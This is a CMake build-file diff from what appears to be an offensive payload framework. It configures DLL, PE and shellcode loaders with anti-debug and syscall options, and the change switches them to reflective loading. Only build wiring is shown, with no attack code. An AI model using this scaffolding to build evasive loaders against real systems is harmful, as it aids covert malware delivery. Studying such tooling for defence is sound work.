@@ -39,6 +39,9 @@ endif()
 if(${PAYLOAD_ANTI_DEBUG} STREQUAL "true")
     add_compile_definitions(PAYLOAD_ANTI_DEBUG=${PAYLOAD_ANTI_DEBUG})
 endif()
+if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
+    add_compile_definitions(IS_DLL=1)
+endif()
 if(${PAYLOAD_FORMAT} STREQUAL "bin")
     add_compile_definitions(IS_SHELLCODE=1)
 endif()
@@ -46,7 +49,7 @@ endif()
 # SOURCES
 set(SOURCE_ASM
     ${ASM_OBJ_SYSCALLS}
-    ${ASM_OBJ_START}
+    ${ASM_OBJ_REFLECTIVE}
 )
 
 set(SOURCE_CORE
@@ -73,22 +76,22 @@ set(SOURCE_CORE
         src/core/utils/convert.cpp
 )
 if(${PAYLOAD_TYPE} STREQUAL \"dll-loader\")
-    if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
-        set(SOURCE_MAIN src/main/dll_loader_exe.cpp src/main/entry.cpp)
-    elseif(${PAYLOAD_FORMAT} STREQUAL "dll")
-        set(SOURCE_MAIN src/main/dll_loader_dll.cpp src/main/entry.cpp)
+    if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
+        set(SOURCE_MAIN src/main/dll_loader_dll.cpp src/main/rfl.cpp)
+    elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN src/main/dll_loader_exe.cpp src/main/rfl.cpp)
     endif()
 elseif(${PAYLOAD_TYPE} STREQUAL \"pe-loader\")
-    if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
-        set(SOURCE_MAIN src/main/pe_loader_exe.cpp src/main/entry.cpp)
-    elseif(${PAYLOAD_FORMAT} STREQUAL "dll")
-        set(SOURCE_MAIN src/main/pe_loader_dll.cpp src/main/entry.cpp)
+    if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
+        set(SOURCE_MAIN src/main/pe_loader_dll.cpp src/main/rfl.cpp)
+    elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN src/main/pe_loader_exe.cpp src/main/rfl.cpp)
     endif()
 elseif(${PAYLOAD_TYPE} STREQUAL \"shellcode-loader\")
-    if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
-        set(SOURCE_MAIN src/main/shellcode_loader_exe.cpp src/main/entry.cpp)
-    elseif(${PAYLOAD_FORMAT} STREQUAL "dll")
-        set(SOURCE_MAIN src/main/shellcode_loader_dll.cpp src/main/entry.cpp)
+    if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
+        set(SOURCE_MAIN src/main/shellcode_loader_dll.cpp src/main/rfl.cpp)
+    elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN src/main/shellcode_loader_exe.cpp src/main/rfl.cpp)
     endif()
 endif()
 
@@ -96,7 +99,7 @@ endif()
 link_libraries(bcrypt crypt32 psapi winhttp wsock32)
 
 # ADD
-if(${PAYLOAD_FORMAT} STREQUAL "dll")
+if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
     add_library(${PROJECT_NAME} SHARED ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
     set_target_properties(${PROJECT_NAME}
         PROPERTIES
@@ -104,8 +107,7 @@ if(${PAYLOAD_FORMAT} STREQUAL "dll")
             PREFIX ""
             SUFFIX ".dll"
     )
-    add_definitions(-DIS_DLL)
-elseif(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
+elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
     add_executable(${PROJECT_NAME} WIN32 ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
     set_target_properties(${PROJECT_NAME}
         PROPERTIES
